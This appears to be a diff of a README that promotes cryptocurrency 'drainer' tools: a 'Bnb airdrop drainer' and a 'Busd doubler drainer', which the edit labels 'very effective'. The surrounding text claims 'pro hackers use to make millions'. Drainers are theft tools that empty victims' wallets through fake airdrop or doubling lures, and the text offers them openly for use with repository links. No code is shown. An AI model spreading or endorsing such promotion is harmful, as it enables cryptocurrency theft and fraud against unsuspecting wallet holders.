@@ -11,7 +11,7 @@ This is the same method pro hackers use to make millions
 !!! Check out my new Bnb airdrop drainer https://github.com/moneywithbots/bnb-airdrop-drainer !!!
 
 
-!!! Check out my new Busd doubler drainer https://github.com/moneywithbots/bnb-busd-doubler-drainer !!!
+!!! Check out my new Busd doubler drainer (very effective) https://github.com/moneywithbots/bnb-busd-doubler-drainer !!!
 
 
 
